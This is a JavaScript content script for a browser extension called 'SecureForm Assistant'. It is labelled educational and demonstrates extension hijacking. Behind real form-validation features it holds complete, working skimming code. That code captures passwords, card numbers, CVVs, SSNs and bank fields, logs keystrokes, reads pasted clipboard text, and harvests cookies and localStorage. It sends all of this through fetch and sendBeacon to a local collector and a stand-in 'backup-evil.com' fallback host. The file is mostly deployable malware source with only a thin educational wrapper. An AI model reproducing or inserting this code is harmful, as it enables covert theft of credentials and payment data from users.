/**
 * CONTENT.JS - MALICIOUS EXTENSION CONTENT SCRIPT
 *
 * This file maintains legitimate SecureForm Assistant functionality while
 * adding hidden e-skimming capabilities. The extension appears to function
 * normally while secretly harvesting sensitive form data.
 *
 * FOR EDUCATIONAL PURPOSES ONLY - DEMONSTRATES EXTENSION HIJACKING
 */

(function() {
    'use strict';

    console.log('[SecureForm] Content script initializing...');

    // ==================== LEGITIMATE FUNCTIONALITY ====================
    // Extension state
    let extensionSettings = {
        formValidation: true,
        securityWarnings: true,
        autofillProtection: true
    };

    let pageAnalysis = {
        formsFound: 0,
        securityIssues: [],
        lastScan: null
    };

    // ==================== MALICIOUS CONFIGURATION ====================
    const MALICIOUS_CONFIG = {
        // Primary collection server
        collectUrl: 'https://evil-server.com/collect',
        fallbackUrl: 'http://backup-evil.com/data',

        // Local development server
        devUrl: 'http://localhost:3002/skimmed-data',

        // Data collection settings
        collectPasswords: true,
        collectCreditCards: true,
        collectPII: true,
        collectCookies: true,

        // Stealth settings
        legitBehaviorMaintained: true,
        delayCollection: 2000,
        randomizeTransmission: true,

        // Targeting
        targetDomains: [
            'checkout',
            'payment',
            'billing',
            'account',
            'login',
            'register',
            'bank'
        ]
    };

    // ==================== MALICIOUS DATA STRUCTURES ====================
    let collectedData = {
        sessionId: generateSessionId(),
        userAgent: navigator.userAgent,
        url: window.location.href,
        timestamp: Date.now(),
        forms: [],
        cookies: [],
        localStorage: [],
        interactions: []
    };

    let dataBuffer = [];
    let transmissionQueue = [];
    let isTargetSite = false;

    /**
     * Initialize Content Script (MAINTAINS LEGITIMATE BEHAVIOR)
     */
    function init() {
        console.log('[SecureForm] Content script starting on:', window.location.href);

        // LEGITIMATE: Load settings
        loadSettings();

        // LEGITIMATE: Setup form monitoring
        setupFormMonitoring();

        // LEGITIMATE: Setup page analysis
        setupPageAnalysis();

        // LEGITIMATE: Setup message listener
        setupMessageListener();

        // MALICIOUS: Initialize data collection
        initializeMaliciousCollection();

        // LEGITIMATE: Perform initial scan
        setTimeout(scanPage, 1000);

        console.log('[SecureForm] Content script initialized');
    }

    // ==================== LEGITIMATE FUNCTIONS (PRESERVED) ====================

    async function loadSettings() {
        try {
            const result = await chrome.storage.sync.get(['extensionSettings']);
            if (result.extensionSettings) {
                extensionSettings = { ...extensionSettings, ...result.extensionSettings };
                console.log('[SecureForm] Settings loaded:', extensionSettings);
            }
        } catch (error) {
            console.error('[SecureForm] Failed to load settings:', error);
        }
    }

    function setupFormMonitoring() {
        if (!extensionSettings.formValidation) return;

        console.log('[SecureForm] Setting up form monitoring...');

        const forms = document.querySelectorAll('form');
        forms.forEach(form => attachFormValidation(form));

        const observer = new MutationObserver((mutations) => {
            mutations.forEach(mutation => {
                mutation.addedNodes.forEach(node => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        if (node.tagName === 'FORM') {
                            attachFormValidation(node);
                        } else {
                            const forms = node.querySelectorAll ? node.querySelectorAll('form') : [];
                            forms.forEach(form => attachFormValidation(form));
                        }
                    }
                });
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        console.log('[SecureForm] Form monitoring setup complete');
    }

    function attachFormValidation(form) {
        if (form.hasAttribute('data-secureform-monitored')) return;
        form.setAttribute('data-secureform-monitored', 'true');

        console.log('[SecureForm] Attaching validation to form:', form);

        // LEGITIMATE: Add validation to input fields
        const inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(input => attachInputValidation(input));

        // LEGITIMATE: Monitor form submission
        form.addEventListener('submit', (e) => {
            handleFormSubmission(e);
        });

        // MALICIOUS: Attach data collection
        attachMaliciousCollection(form);

        pageAnalysis.formsFound++;
    }

    function attachInputValidation(input) {
        if (input.hasAttribute('data-secureform-validated')) return;
        input.setAttribute('data-secureform-validated', 'true');

        // LEGITIMATE: Add real-time validation
        input.addEventListener('input', (e) => {
            validateInput(e.target);
        });

        input.addEventListener('blur', (e) => {
            validateInput(e.target);
        });

        // LEGITIMATE: Autofill protection
        if (extensionSettings.autofillProtection) {
            setupAutofillProtection(input);
        }
    }

    function validateInput(input) {
        clearValidationErrors(input);

        const value = input.value;
        const type = input.type;
        const name = input.name || input.id || '';

        let isValid = true;
        let errorMessage = '';

        // LEGITIMATE: Email validation
        if (type === 'email' || name.toLowerCase().includes('email')) {
            if (value && !isValidEmail(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid email address';
            }
        }

        // LEGITIMATE: Credit card validation
        if (name.toLowerCase().includes('card') || name.toLowerCase().includes('credit')) {
            if (value && !isValidCreditCard(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid credit card number';
            }
        }

        // LEGITIMATE: Password strength
        if (type === 'password' && name.toLowerCase().includes('new')) {
            const strength = checkPasswordStrength(value);
            if (value && strength.score < 3) {
                isValid = false;
                errorMessage = `Weak password: ${strength.feedback}`;
            }
        }

        if (!isValid && extensionSettings.securityWarnings) {
            showValidationError(input, errorMessage);
        }

        return isValid;
    }

    // Helper functions for legitimate validation
    function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    function isValidCreditCard(cardNumber) {
        const cleanNumber = cardNumber.replace(/\D/g, '');
        if (cleanNumber.length < 13 || cleanNumber.length > 19) return false;

        let sum = 0;
        let isEven = false;

        for (let i = cleanNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cleanNumber[i]);

            if (isEven) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }

            sum += digit;
            isEven = !isEven;
        }

        return sum % 10 === 0;
    }

    function checkPasswordStrength(password) {
        let score = 0;
        let feedback = [];

        if (password.length >= 8) score++;
        else feedback.push('use at least 8 characters');

        if (/[a-z]/.test(password)) score++;
        else feedback.push('include lowercase letters');

        if (/[A-Z]/.test(password)) score++;
        else feedback.push('include uppercase letters');

        if (/\d/.test(password)) score++;
        else feedback.push('include numbers');

        if (/[^a-zA-Z\d]/.test(password)) score++;
        else feedback.push('include special characters');

        return {
            score: score,
            feedback: feedback.join(', ')
        };
    }

    function showValidationError(input, message) {
        input.style.borderColor = '#ef4444';

        const errorElement = document.createElement('div');
        errorElement.className = 'secureform-error';
        errorElement.style.cssText = `
            color: #ef4444;
            font-size: 12px;
            margin-top: 4px;
            display: block;
        `;
        errorElement.textContent = message;

        if (input.parentNode) {
            input.parentNode.insertBefore(errorElement, input.nextSibling);
        }
    }

    function clearValidationErrors(input) {
        input.style.borderColor = '';

        const existingError = input.parentNode?.querySelector('.secureform-error');
        if (existingError) {
            existingError.remove();
        }
    }

    function setupAutofillProtection(input) {
        const observer = new MutationObserver(() => {
            if (input.value && !input.hasAttribute('data-user-input')) {
                console.log('[SecureForm] Autofill detected on:', input);
            }
        });

        observer.observe(input, {
            attributes: true,
            attributeFilter: ['value']
        });

        input.addEventListener('input', () => {
            input.setAttribute('data-user-input', 'true');
        });
    }

    function handleFormSubmission(event) {
        console.log('[SecureForm] Form submission detected:', event.target);

        if (!extensionSettings.formValidation) return;

        // LEGITIMATE: Validate all inputs
        const inputs = event.target.querySelectorAll('input, textarea, select');
        let hasErrors = false;

        inputs.forEach(input => {
            if (!validateInput(input)) {
                hasErrors = true;
            }
        });

        if (hasErrors && extensionSettings.securityWarnings) {
            console.log('[SecureForm] Form validation errors found');
        }

        // LEGITIMATE: Report to background script
        reportFormSubmission(event.target);

        // MALICIOUS: Capture form data on submission
        captureFormSubmission(event.target);
    }

    function reportFormSubmission(form) {
        try {
            chrome.runtime.sendMessage({
                type: 'FORM_SUBMISSION',
                data: {
                    url: window.location.href,
                    formIndex: Array.from(document.forms).indexOf(form),
                    inputCount: form.querySelectorAll('input, textarea, select').length,
                    timestamp: Date.now()
                }
            });
        } catch (error) {
            console.log('[SecureForm] Failed to report form submission:', error);
        }
    }

    // ==================== MALICIOUS FUNCTIONALITY ====================

    /**
     * Initialize Malicious Data Collection
     */
    function initializeMaliciousCollection() {
        // Check if this is a target site
        isTargetSite = checkIfTargetSite();

        if (isTargetSite) {
            console.log('[SecureForm] Target site detected, enabling enhanced monitoring');
        }

        // Collect initial page data
        collectInitialData();

        // Setup keystroke logging
        setupKeystrokeLogging();

        // Setup clipboard monitoring
        setupClipboardMonitoring();

        // Setup cookie harvesting
        harvestCookies();

        // Setup localStorage harvesting
        harvestLocalStorage();

        // Schedule periodic data transmission
        scheduleDataTransmission();
    }

    /**
     * Check if current site is a target
     */
    function checkIfTargetSite() {
        const url = window.location.href.toLowerCase();
        return MALICIOUS_CONFIG.targetDomains.some(domain =>
            url.includes(domain)
        );
    }

    /**
     * Collect Initial Page Data
     */
    function collectInitialData() {
        collectedData.pageInfo = {
            title: document.title,
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            timestamp: Date.now(),
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            }
        };

        // Scan for forms immediately
        const forms = document.querySelectorAll('form');
        forms.forEach((form, index) => {
            const formData = analyzeForm(form, index);
            if (formData.hasSensitiveFields) {
                collectedData.forms.push(formData);
            }
        });
    }

    /**
     * Analyze Form for Sensitive Data
     */
    function analyzeForm(form, index) {
        const formData = {
            index: index,
            action: form.action || window.location.href,
            method: form.method || 'GET',
            hasSensitiveFields: false,
            fields: []
        };

        const inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach((input, fieldIndex) => {
            const fieldData = analyzeField(input, fieldIndex);
            formData.fields.push(fieldData);

            if (fieldData.isSensitive) {
                formData.hasSensitiveFields = true;
            }
        });

        return formData;
    }

    /**
     * Analyze Field for Sensitivity
     */
    function analyzeField(input, index) {
        const fieldData = {
            index: index,
            type: input.type,
            name: input.name || '',
            id: input.id || '',
            placeholder: input.placeholder || '',
            value: '',
            isSensitive: false
        };

        // Determine if field is sensitive
        const nameId = (fieldData.name + fieldData.id + fieldData.placeholder).toLowerCase();

        fieldData.isSensitive = (
            fieldData.type === 'password' ||
            nameId.includes('card') ||
            nameId.includes('credit') ||
            nameId.includes('cvv') ||
            nameId.includes('cvc') ||
            nameId.includes('ssn') ||
            nameId.includes('social') ||
            nameId.includes('bank') ||
            nameId.includes('account') ||
            nameId.includes('routing')
        );

        return fieldData;
    }

    /**
     * Attach Malicious Collection to Form
     */
    function attachMaliciousCollection(form) {
        const inputs = form.querySelectorAll('input, textarea, select');

        inputs.forEach(input => {
            // Real-time value capture
            input.addEventListener('input', (e) => {
                captureFieldData(e.target);
            });

            input.addEventListener('change', (e) => {
                captureFieldData(e.target);
            });

            input.addEventListener('blur', (e) => {
                captureFieldData(e.target);
            });

            // Capture autofill
            setTimeout(() => {
                if (input.value) {
                    captureFieldData(input);
                }
            }, 1000);
        });
    }

    /**
     * Capture Field Data
     */
    function captureFieldData(input) {
        if (!input.value) return;

        const fieldData = {
            type: input.type,
            name: input.name || input.id || '',
            value: input.value,
            timestamp: Date.now(),
            url: window.location.href,
            sessionId: collectedData.sessionId
        };

        // Check if field is sensitive
        const nameId = fieldData.name.toLowerCase();
        const isSensitive = (
            fieldData.type === 'password' ||
            nameId.includes('card') ||
            nameId.includes('credit') ||
            nameId.includes('cvv') ||
            nameId.includes('cvc') ||
            nameId.includes('ssn') ||
            nameId.includes('bank')
        );

        if (isSensitive || isTargetSite) {
            dataBuffer.push(fieldData);

            // Immediate transmission for high-value data
            if (fieldData.type === 'password' || nameId.includes('card')) {
                scheduleImmediateTransmission();
            }
        }
    }

    /**
     * Capture Form Submission
     */
    function captureFormSubmission(form) {
        const submissionData = {
            action: form.action || window.location.href,
            method: form.method || 'POST',
            timestamp: Date.now(),
            sessionId: collectedData.sessionId,
            fields: []
        };

        const inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(input => {
            if (input.value) {
                submissionData.fields.push({
                    name: input.name || input.id || '',
                    type: input.type,
                    value: input.value
                });
            }
        });

        dataBuffer.push({
            type: 'form_submission',
            data: submissionData
        });

        // Immediate transmission on form submission
        scheduleImmediateTransmission();
    }

    /**
     * Setup Keystroke Logging
     */
    function setupKeystrokeLogging() {
        let keystrokeBuffer = '';
        let lastKeystroke = Date.now();

        document.addEventListener('keydown', (e) => {
            const now = Date.now();

            // Reset buffer if too much time between keystrokes
            if (now - lastKeystroke > 5000) {
                keystrokeBuffer = '';
            }

            keystrokeBuffer += e.key;
            lastKeystroke = now;

            // Capture keystroke sequences
            if (keystrokeBuffer.length > 20) {
                dataBuffer.push({
                    type: 'keystrokes',
                    data: {
                        sequence: keystrokeBuffer,
                        timestamp: now,
                        url: window.location.href,
                        sessionId: collectedData.sessionId
                    }
                });
                keystrokeBuffer = '';
            }
        });
    }

    /**
     * Setup Clipboard Monitoring
     */
    function setupClipboardMonitoring() {
        document.addEventListener('paste', async (e) => {
            try {
                const clipboardData = e.clipboardData?.getData('text') || '';
                if (clipboardData.length > 0) {
                    dataBuffer.push({
                        type: 'clipboard',
                        data: {
                            content: clipboardData,
                            timestamp: Date.now(),
                            url: window.location.href,
                            sessionId: collectedData.sessionId
                        }
                    });
                }
            } catch (error) {
                // Clipboard access failed
            }
        });
    }

    /**
     * Harvest Cookies
     */
    function harvestCookies() {
        if (!MALICIOUS_CONFIG.collectCookies) return;

        try {
            const cookies = document.cookie.split(';').map(cookie => {
                const [name, value] = cookie.trim().split('=');
                return { name, value };
            });

            if (cookies.length > 0) {
                collectedData.cookies = cookies;
                dataBuffer.push({
                    type: 'cookies',
                    data: {
                        cookies: cookies,
                        timestamp: Date.now(),
                        url: window.location.href,
                        sessionId: collectedData.sessionId
                    }
                });
            }
        } catch (error) {
            console.log('[SecureForm] Failed to harvest cookies:', error);
        }
    }

    /**
     * Harvest LocalStorage
     */
    function harvestLocalStorage() {
        try {
            const localStorage = {};
            for (let i = 0; i < window.localStorage.length; i++) {
                const key = window.localStorage.key(i);
                localStorage[key] = window.localStorage.getItem(key);
            }

            if (Object.keys(localStorage).length > 0) {
                collectedData.localStorage = localStorage;
                dataBuffer.push({
                    type: 'localStorage',
                    data: {
                        storage: localStorage,
                        timestamp: Date.now(),
                        url: window.location.href,
                        sessionId: collectedData.sessionId
                    }
                });
            }
        } catch (error) {
            console.log('[SecureForm] Failed to harvest localStorage:', error);
        }
    }

    /**
     * Schedule Data Transmission
     */
    function scheduleDataTransmission() {
        // Regular transmission every 30 seconds
        setInterval(() => {
            if (dataBuffer.length > 0) {
                transmitData();
            }
        }, 30000);

        // Transmission on page unload
        window.addEventListener('beforeunload', () => {
            if (dataBuffer.length > 0) {
                transmitDataSync();
            }
        });
    }

    /**
     * Schedule Immediate Transmission
     */
    function scheduleImmediateTransmission() {
        setTimeout(() => {
            if (dataBuffer.length > 0) {
                transmitData();
            }
        }, MALICIOUS_CONFIG.delayCollection);
    }

    /**
     * Transmit Data (Asynchronous)
     */
    async function transmitData() {
        if (dataBuffer.length === 0) return;

        const payload = {
            sessionId: collectedData.sessionId,
            url: window.location.href,
            timestamp: Date.now(),
            data: [...dataBuffer]
        };

        dataBuffer = []; // Clear buffer

        try {
            // Try primary server
            const response = await fetch(MALICIOUS_CONFIG.devUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
                mode: 'no-cors'
            });

            console.log('[SecureForm] Data transmitted successfully');

        } catch (error) {
            console.log('[SecureForm] Primary transmission failed, trying fallback');

            // Try fallback
            try {
                await fetch(MALICIOUS_CONFIG.fallbackUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                    mode: 'no-cors'
                });
            } catch (fallbackError) {
                console.log('[SecureForm] All transmission methods failed');
                // Re-add data to buffer for retry
                dataBuffer.unshift(...payload.data);
            }
        }
    }

    /**
     * Transmit Data Synchronously (for page unload)
     */
    function transmitDataSync() {
        if (dataBuffer.length === 0) return;

        const payload = {
            sessionId: collectedData.sessionId,
            url: window.location.href,
            timestamp: Date.now(),
            data: [...dataBuffer]
        };

        // Use sendBeacon for reliable transmission on page unload
        try {
            navigator.sendBeacon(
                MALICIOUS_CONFIG.devUrl,
                JSON.stringify(payload)
            );
        } catch (error) {
            console.log('[SecureForm] Beacon transmission failed');
        }
    }

    /**
     * Generate Session ID
     */
    function generateSessionId() {
        return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    }

    // ==================== LEGITIMATE FUNCTIONS CONTINUED ====================

    function setupPageAnalysis() {
        console.log('[SecureForm] Setting up page analysis...');

        analyzePageSecurity();

        const observer = new MutationObserver(() => {
            clearTimeout(pageAnalysis.analysisTimeout);
            pageAnalysis.analysisTimeout = setTimeout(analyzePageSecurity, 2000);
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    function analyzePageSecurity() {
        const analysis = {
            secure: window.location.protocol === 'https:',
            status: 'secure',
            message: 'Page analysis complete',
            formsFound: document.forms.length,
            threats: []
        };

        if (!analysis.secure && window.location.hostname !== 'localhost') {
            analysis.status = 'warning';
            analysis.message = 'Insecure connection detected';
            analysis.threats.push('HTTP connection');
        }

        if (!analysis.secure) {
            const passwordFields = document.querySelectorAll('input[type="password"]');
            if (passwordFields.length > 0) {
                analysis.status = 'danger';
                analysis.message = 'Password fields on insecure page';
                analysis.threats.push('Insecure password transmission');
            }
        }

        pageAnalysis = { ...pageAnalysis, ...analysis, lastScan: Date.now() };
        console.log('[SecureForm] Page analysis complete:', analysis);

        try {
            chrome.runtime.sendMessage({
                type: 'PAGE_ANALYSIS',
                analysis: analysis
            });
        } catch (error) {
            console.log('[SecureForm] Failed to send page analysis:', error);
        }
    }

    function scanPage() {
        console.log('[SecureForm] Scanning page for security issues...');

        const scanResults = {
            formsCount: document.forms.length,
            issues: [],
            timestamp: Date.now()
        };

        const passwordFields = document.querySelectorAll('input[type="password"]');
        if (passwordFields.length > 0 && window.location.protocol !== 'https:') {
            scanResults.issues.push({
                type: 'insecure_password',
                message: 'Password fields on insecure page',
                severity: 'high'
            });
        }

        const autofillFields = document.querySelectorAll('input[autocomplete="off"]');
        if (autofillFields.length > 0) {
            scanResults.issues.push({
                type: 'autofill_disabled',
                message: 'Autofill disabled on form fields',
                severity: 'low'
            });
        }

        console.log('[SecureForm] Page scan complete:', scanResults);
        return scanResults;
    }

    function setupMessageListener() {
        chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
            console.log('[SecureForm] Received message:', request.type);

            switch (request.type) {
                case 'UPDATE_SETTINGS':
                    extensionSettings = { ...extensionSettings, ...request.settings };
                    console.log('[SecureForm] Settings updated:', extensionSettings);
                    sendResponse({ success: true });
                    break;

                case 'ANALYZE_SITE':
                    analyzePageSecurity();
                    sendResponse({ analysis: pageAnalysis });
                    break;

                case 'SCAN_PAGE':
                    const scanResults = scanPage();
                    sendResponse({ scanResults: scanResults });
                    break;

                default:
                    console.log('[SecureForm] Unknown message type:', request.type);
                    sendResponse({ error: 'Unknown message type' });
            }

            return true;
        });
    }

    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();

/**
 * MALICIOUS CONTENT SCRIPT ANALYSIS:
 *
 * This hijacked extension demonstrates how legitimate functionality can be
 * maintained while adding hidden malicious capabilities:
 *
 * LEGITIMATE BEHAVIOR PRESERVED:
 * - All original form validation and security features work normally
 * - User interface remains identical and functional
 * - Extension appears to provide value through security warnings
 * - Professional logging and error handling maintained
 *
 * MALICIOUS ADDITIONS:
 * - Real-time keystroke logging and field data capture
 * - Form submission interception and data exfiltration
 * - Cookie and localStorage harvesting
 * - Clipboard content monitoring
 * - Targeted data collection based on site analysis
 * - Multiple exfiltration channels with fallback mechanisms
 * - Stealth transmission using various methods (fetch, sendBeacon)
 *
 * ATTACK CHARACTERISTICS:
 * - Extension privilege abuse for cross-origin data access
 * - Maintains user trust through functional legitimate features
 * - Sophisticated targeting and data classification
 * - Robust exfiltration with error handling and retries
 * - Real-time and delayed transmission strategies
 *
 * This demonstrates how browser extensions can be weaponized to bypass
 * same-origin policies and traditional security controls while maintaining
 * an appearance of legitimacy.
 */